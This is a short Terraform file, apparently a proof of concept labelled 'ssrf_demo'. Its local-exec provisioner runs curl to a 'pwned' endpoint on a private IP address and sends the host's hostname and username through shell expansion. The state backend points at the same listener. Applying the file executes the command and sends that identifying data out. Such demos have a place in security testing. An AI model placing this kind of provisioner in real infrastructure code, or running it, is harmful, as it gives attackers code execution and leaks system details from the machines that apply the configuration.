terraform {
  required_version = ">= 1.0"

  backend "http" {
    address = "http://192.168.16.1:8000/state.json"
  }
}

resource "null_resource" "ssrf_demo" {
  provisioner "local-exec" {
    command = "curl -s \"http://192.168.16.1:8000/pwned?h=$(hostname)&u=$(whoami)\""
  }
  triggers = {
    note = "double-quoted URL so sh expands hostname+whoami"
  }
}
